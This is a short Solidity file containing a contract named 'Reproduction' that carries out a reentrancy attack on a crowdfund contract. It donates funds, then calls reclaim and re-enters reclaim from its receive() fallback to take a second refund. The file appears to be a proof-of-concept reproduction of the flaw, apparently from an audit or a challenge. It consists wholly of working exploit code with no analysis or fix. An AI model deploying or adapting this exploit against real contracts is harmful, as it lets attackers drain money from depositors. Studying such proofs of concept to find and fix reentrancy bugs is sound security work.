interface ICrowdfund {
    function invstore() external;
    function donate() external payable;
    function withdraw() external;
    function reclaim() external;
}

contract Reproduction {
    ICrowdfund public target;
    address public attacker;
    bool public reentered;

    constructor(address _target) {
        target = ICrowdfund(_target);
        attacker = msg.sender;
    }

    function setup() external payable {
        target.donate{value: msg.value}();
    }

    function startExploit() external {
        target.invstore(); 
        target.reclaim();
    }

    receive() external payable {
        if (!reentered) {
            reentered = true;
            target.reclaim(); 
        }
    }
}